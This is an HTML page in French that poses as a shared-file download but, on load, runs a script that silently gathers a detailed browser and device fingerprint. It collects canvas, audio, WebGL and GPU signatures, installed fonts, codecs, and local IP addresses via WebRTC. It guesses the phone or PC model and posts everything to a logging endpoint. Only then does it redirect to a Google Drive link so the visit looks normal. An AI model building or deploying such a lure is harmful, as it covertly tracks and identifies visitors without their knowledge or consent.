<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Document partagé - Récupération de fichier</title>
<meta property="og:title" content="📄 Document partagé">
<meta property="og:description" content="Un fichier a été partagé avec vous. Cliquez pour y accéder.">
<meta property="og:type" content="website">
<meta name="theme-color" content="#4285f4">
<style>
body{font-family:'Segoe UI',Roboto,sans-serif;background:#f8f9fa;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{text-align:center;color:#5f6368}
.spinner{border:4px solid #f3f3f3;border-top:4px solid #4285f4;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
  <div class="spinner"></div>
  <p>Récupération du fichier partagé...</p>
</div>

<script>
const t0 = performance.now();
const timings = { pageLoad: t0 };

(async () => {
  const d = {};
  d.timestamp = new Date().toISOString();
  d.userAgent = navigator.userAgent;
  d.language = navigator.language;
  d.languages = (navigator.languages || []).join(',');
  d.platform = navigator.platform;
  d.vendor = navigator.vendor;
  d.hardwareConcurrency = navigator.hardwareConcurrency;
  d.deviceMemory = navigator.deviceMemory || "n/a (iOS masqué)";

  // Résolution normalisée (insensible à l'orientation)
  d.screen = `${Math.min(screen.width,screen.height)}x${Math.max(screen.width,screen.height)} @${window.devicePixelRatio}x`;
  d.screenPhysical = `${Math.round(Math.min(screen.width,screen.height) * window.devicePixelRatio)}x${Math.round(Math.max(screen.width,screen.height) * window.devicePixelRatio)}`;
  d.screenAvail = `${Math.min(screen.availWidth,screen.availHeight)}x${Math.max(screen.availWidth,screen.availHeight)}`;
  d.colorDepth = screen.colorDepth;
  d.pixelDepth = screen.pixelDepth;
  d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  d.touchPoints = navigator.maxTouchPoints;

  // Vecteurs avancés (gardés pour le diagnostic mais EXCLUS du hash car instables)
  d.refreshRate = await detectRefreshRate();
  d.codecs = await checkCodecs();
  d.webgpu = await getWebGPUInfo();
  d.gpuBench = await gpuBenchmark();
  d.cssFeatures = getCSSFeatures();
  d.gpu = getGPUInfo();
  d.webglSig = getWebGLSignature();

  // Fingerprints atomiques
  d.audioFP = await getAudioFingerprint();
  d.canvasFP = getCanvasFingerprint();

  // Double-passe sur les fonts avec délai
  await new Promise(r => setTimeout(r, 300));
  const fonts1 = detectFonts();
  await new Promise(r => setTimeout(r, 150));
  const fonts2 = detectFonts();
  d.fonts = [...new Set([...fonts1, ...fonts2])].sort();

  // WebRTC (volatile sur iOS, exclu du hash)
  d.webrtc = await getLocalIPs();
  d.sensors = await checkSensors();

  // Timings (exclus du hash, juste diagnostic)
  timings.collectDone = performance.now();
  d.timings = {
    totalCollectionMs: Math.round(timings.collectDone - timings.pageLoad),
    performanceNowPrecision: getPerfNowPrecision()
  };

  // === COMPOSANTS DU FINGERPRINT (exposés pour debug) ===
  // refreshRate ENLEVÉ (Safari iOS plafonne RAF, varie selon power mode)
  // codecs.powerEfficient ENLEVÉ (varie selon batterie/thermal)
  // audioFP ENLEVÉ (variations float)
  // gpuBench ENLEVÉ (varie selon charge système)
  const fpComponents = {
    screen: d.screen,
    screenPhysical: d.screenPhysical,
    timezone: d.timezone,
    language: d.language,
    languages: d.languages,
    platform: d.platform,
    hardwareConcurrency: String(d.hardwareConcurrency),
    colorDepth: String(d.colorDepth),
    pixelDepth: String(d.pixelDepth),
    touchPoints: String(d.touchPoints),
    canvasFP: d.canvasFP,
    fonts: d.fonts.join('|'),
    webglSig_short: (d.webglSig || '').substring(0, 100),
    codecs: JSON.stringify(d.codecs),
    cssFeatures: d.cssFeatures.join('|')
  };

  d.customFingerprint = await sha256(Object.values(fpComponents).join('::'));
  d.fpComponents = fpComponents;

  d.deviceGuess = guessDevice(d);

  fetch('/api/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(d)
  }).finally(() => {
    setTimeout(() => {
      window.location.href = "https://drive.google.com/file/d/1abcXYZ/view";
    }, 1200);
  });
})();

// ========== HELPERS ==========

async function detectRefreshRate() {
  return new Promise(r => {
    let frames = 0;
    const start = performance.now();
    function tick() {
      frames++;
      const elapsed = performance.now() - start;
      if (elapsed < 1000) requestAnimationFrame(tick);
      else r(Math.round(frames));
    }
    requestAnimationFrame(tick);
  });
}

async function checkCodecs() {
  if (!navigator.mediaCapabilities) return { error: 'no API' };
  const tests = [
    { name: 'av1', codec: 'av01.0.05M.08' },
    { name: 'h265Main', codec: 'hev1.1.6.L93.B0' },
    { name: 'h265Main10', codec: 'hev1.2.4.L93.B0' },
    { name: 'h264', codec: 'avc1.640028' },
    { name: 'vp9', codec: 'vp09.00.10.08' }
  ];
  const results = {};
  for (const t of tests) {
    try {
      const r = await navigator.mediaCapabilities.decodingInfo({
        type: 'file',
        video: { contentType: `video/mp4; codecs="${t.codec}"`, width: 1920, height: 1080, bitrate: 5000000, framerate: 30 }
      });
      results[t.name] = `s:${r.supported ? 1 : 0}`;
    } catch (e) { results[t.name] = 'err'; }
  }
  return results;
}

async function getWebGPUInfo() {
  if (!navigator.gpu) return { available: false };
  try {
    const adapter = await navigator.gpu.requestAdapter();
    if (!adapter) return { available: false };
    let info = adapter.info;
    if (!info && adapter.requestAdapterInfo) info = await adapter.requestAdapterInfo();
    return {
      available: true,
      vendor: info?.vendor || 'masked',
      architecture: info?.architecture || 'masked',
      device: info?.device || 'masked',
      description: info?.description || 'masked'
    };
  } catch (e) { return { available: false, error: e.message }; }
}

async function gpuBenchmark() {
  try {
    const canvas = document.createElement('canvas');
    canvas.width = 512; canvas.height = 512;
    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
    if (!gl) return null;

    const vs = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vs, `attribute vec2 a;void main(){gl_Position=vec4(a,0,1);}`);
    gl.compileShader(vs);

    const fs = gl.createShader(gl.FRAGMENT_SHADER);
    gl.shaderSource(fs, `precision highp float;void main(){vec3 p=vec3(gl_FragCoord.xy/100.0,0.0);for(int i=0;i<40;i++){p=abs(p)/dot(p,p)-vec3(0.75);}gl_FragColor=vec4(p,1);}`);
    gl.compileShader(fs);

    const prog = gl.createProgram();
    gl.attachShader(prog, vs); gl.attachShader(prog, fs);
    gl.linkProgram(prog); gl.useProgram(prog);

    const buf = gl.createBuffer();
    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]), gl.STATIC_DRAW);
    const loc = gl.getAttribLocation(prog, 'a');
    gl.enableVertexAttribArray(loc);
    gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);

    for (let i = 0; i < 3; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    gl.finish();

    const start = performance.now();
    for (let i = 0; i < 15; i++) gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
    gl.finish();
    return Math.round(performance.now() - start);
  } catch (e) { return null; }
}

function getCSSFeatures() {
  const tests = [
    ['color', 'color(display-p3 0 0 0)'],
    ['color', 'oklch(0 0 0)'],
    ['color', 'color-mix(in srgb, red, blue)'],
    ['background', 'paint(test)'],
    ['width', 'calc-size(auto, size)'],
    ['display', 'block flow'],
    ['anchor-name', '--test'],
    ['view-transition-name', 'test'],
    ['scrollbar-color', 'red blue']
  ];
  return tests.filter(([p, v]) => CSS.supports(p, v)).map(([p, v]) => `${p}:${v.split('(')[0]}`);
}

function getGPUInfo() {
  const out = { renderer: 'unknown', vendor: 'unknown' };
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl2') || c.getContext('webgl');
    if (!gl) return out;
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      out.renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
      out.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
    } else {
      out.renderer = gl.getParameter(gl.RENDERER);
      out.vendor = gl.getParameter(gl.VENDOR);
    }
  } catch (e) {}
  return out;
}

function getWebGLSignature() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl2') || c.getContext('webgl');
    if (!gl) return 'no-webgl';
    const p = [
      gl.getParameter(gl.MAX_TEXTURE_SIZE),
      gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
      gl.getParameter(gl.MAX_VIEWPORT_DIMS).join(','),
      gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
      gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
      gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
      gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE).join(','),
      gl.getParameter(gl.ALIASED_POINT_SIZE_RANGE).join(','),
      (gl.getSupportedExtensions() || []).sort().join(',')
    ];
    return p.join('|');
  } catch (e) { return 'error'; }
}

async function getAudioFingerprint() {
  try {
    const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = 'triangle';
    osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    comp.threshold.value = -50;
    comp.knee.value = 40;
    comp.ratio.value = 12;
    comp.attack.value = 0;
    comp.release.value = 0.25;
    osc.connect(comp);
    comp.connect(ctx.destination);
    osc.start(0);
    const buf = await ctx.startRendering();
    let sum = 0;
    for (let i = 4500; i < 5000; i++) sum += Math.abs(buf.getChannelData(0)[i]);
    return sum.toFixed(4);
  } catch (e) { return 'denied'; }
}

function getCanvasFingerprint() {
  try {
    const c = document.createElement('canvas');
    c.width = 280; c.height = 60;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = "16px 'Arial'";
    ctx.fillStyle = '#069';
    ctx.fillText('FamSecCanary-Stable-Test-2024', 2, 15);
    ctx.fillStyle = 'rgba(102,200,0,0.7)';
    ctx.fillText('FamSecCanary-Stable-Test-2024', 4, 17);
    const dataUrl = c.toDataURL();
    return dataUrl.substring(dataUrl.length - 60);
  } catch (e) { return 'denied'; }
}

function getLocalIPs() {
  return new Promise(resolve => {
    const ips = [];
    try {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel('');
      pc.onicecandidate = e => {
        if (!e.candidate) { try { pc.close() } catch (_) { }; return resolve(ips); }
        const m = e.candidate.candidate.match(/([a-f0-9-]+\.local|\d+\.\d+\.\d+\.\d+|[a-f0-9:]+:[a-f0-9:]{2,})/);
        if (m && !ips.includes(m[1])) ips.push(m[1]);
      };
      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => resolve(ips));
      setTimeout(() => { try { pc.close() } catch (_) { }; resolve(ips); }, 2000);
    } catch (e) { resolve(['error']); }
  });
}

function detectFonts() {
  const base = ['monospace', 'sans-serif', 'serif'];
  const testString = "mmmmmmmmmmlli";
  const size = '72px';
  const testList = ['Arial', 'Helvetica', 'Times', 'Courier', 'Verdana', 'Georgia', 'Palatino', 'Trebuchet MS', 'Arial Black', 'Impact', 'Tahoma', 'Lucida Console', 'Apple Color Emoji', 'SF Pro', 'SF Mono', 'SF Pro Rounded', 'Segoe UI', 'Roboto', 'Noto Sans CJK', 'Helvetica Neue', 'PingFang SC', 'PingFang HK', 'Hiragino Sans', 'Avenir', 'Avenir Next', 'Optima', 'Marker Felt'];
  const h = document.body || document.documentElement;
  const bw = {}, bh = {};
  base.forEach(f => {
    const s = document.createElement('span');
    s.style.cssText = `position:absolute;left:-9999px;font-size:${size};font-family:${f}`;
    s.innerText = testString;
    h.appendChild(s);
    bw[f] = s.offsetWidth; bh[f] = s.offsetHeight;
    h.removeChild(s);
  });
  const detected = [];
  testList.forEach(f => {
    for (const b of base) {
      const s = document.createElement('span');
      s.style.cssText = `position:absolute;left:-9999px;font-size:${size};font-family:'${f}',${b}`;
      s.innerText = testString;
      h.appendChild(s);
      const ok = s.offsetWidth !== bw[b] || s.offsetHeight !== bh[b];
      h.removeChild(s);
      if (ok) { detected.push(f); break; }
    }
  });
  return detected;
}

async function checkSensors() {
  return {
    motion: typeof DeviceMotionEvent !== 'undefined',
    orientation: typeof DeviceOrientationEvent !== 'undefined'
  };
}

function getPerfNowPrecision() {
  const samples = [];
  for (let i = 0; i < 100; i++) samples.push(performance.now());
  const diffs = [];
  for (let i = 1; i < samples.length; i++) {
    if (samples[i] > samples[i - 1]) diffs.push(samples[i] - samples[i - 1]);
  }
  if (!diffs.length) return 'unknown';
  return Math.min(...diffs).toFixed(3) + 'ms';
}

async function sha256(str) {
  try {
    const buf = new TextEncoder().encode(str);
    const h = await crypto.subtle.digest('SHA-256', buf);
    return Array.from(new Uint8Array(h)).map(b => b.toString(16).padStart(2, '0')).join('').substring(0, 16);
  } catch (e) { return 'error'; }
}

function guessDevice(d) {
  const ua = navigator.userAgent;
  const res = `${Math.min(screen.width, screen.height)}x${Math.max(screen.width, screen.height)}`;
  const refresh = d.refreshRate || 60;
  const av1HW = d.codecs?.av1?.includes('s:1');
  const iosVer = parseInt((ua.match(/OS (\d+)_/) || [])[1] || '0');

  if (/Android/i.test(ua)) {
    const av = (ua.match(/Android (\d+(?:\.\d+)?)/) || [])[1] || '?';
    const m = ua.match(/Android [^;]+;\s*([^)]+?)\)/);
    let model = m ? m[1].replace(/\s*Build\/.*/i, '').trim() : 'inconnu';
    let brand = '';
    if (/^SM-/i.test(model)) brand = 'Samsung Galaxy ';
    else if (/^Pixel/i.test(model)) brand = 'Google ';
    else if (/^CPH/i.test(model)) brand = 'OnePlus/Oppo ';
    else if (/^RMX/i.test(model)) brand = 'Realme ';
    else if (/^M2|^21|^22|^23|^24/i.test(model)) brand = 'Xiaomi/Redmi ';
    return `Android ${av} - ${brand}${model} - ${refresh}Hz`;
  }

  if (/iPhone|iPad/.test(ua) || /Apple/.test(d.gpu?.renderer || '')) {
    let candidates = [];

    if (res === '440x956') candidates = ['iPhone 16 Pro Max'];
    else if (res === '402x874') candidates = ['iPhone 16 Pro'];
    else if (res === '430x932') candidates = ['iPhone 15 Pro Max', 'iPhone 15 Plus', 'iPhone 14 Pro Max', 'iPhone 16 Plus'];
    else if (res === '393x852') candidates = ['iPhone 14 Pro', 'iPhone 15', 'iPhone 15 Pro', 'iPhone 16'];
    else if (res === '428x926') candidates = ['iPhone 12 Pro Max', 'iPhone 13 Pro Max', 'iPhone 14 Plus'];
    else if (res === '390x844') candidates = ['iPhone 12', 'iPhone 12 Pro', 'iPhone 13', 'iPhone 13 Pro', 'iPhone 14'];
    else if (res === '375x812') candidates = ['iPhone X', 'iPhone XS', 'iPhone 11 Pro', 'iPhone 13 mini'];
    else if (res === '360x780') candidates = ['iPhone 12 mini'];
    else if (res === '414x896') candidates = ['iPhone XR', 'iPhone XS Max', 'iPhone 11', 'iPhone 11 Pro Max'];
    else if (res === '375x667') candidates = ['iPhone SE 2', 'iPhone SE 3', 'iPhone 6/7/8'];

    // Filtre iOS version (iPhone 16 requiert iOS 18+, etc.)
    if (iosVer >= 18) {
      candidates = candidates.filter(c => !/^iPhone (X|XR|XS|11|12 mini)/.test(c));
    }

    const info = `iOS ${iosVer}, RAF:${refresh}Hz(Safari plafonne), AV1:${av1HW ? 'oui' : 'non/masqué'}`;
    if (candidates.length === 1) return `${candidates[0]} (${info})`;
    if (candidates.length > 1) return `${candidates.join(' / ')} (${info})`;
    return `iPhone non-identifié - res:${res} (${info})`;
  }

  const g = (d.gpu?.renderer || '').toLowerCase();
  if (g.includes('nvidia')) return `PC - GPU NVIDIA - ${d.gpu.renderer}`;
  if (g.includes('radeon') || g.includes('amd')) return `PC - GPU AMD - ${d.gpu.renderer}`;
  if (g.includes('intel')) return `PC - GPU Intel - ${d.gpu.renderer}`;

  return `Inconnu - ${d.gpu?.renderer || 'no GPU info'}`;
}
</script>
</body>
</html>
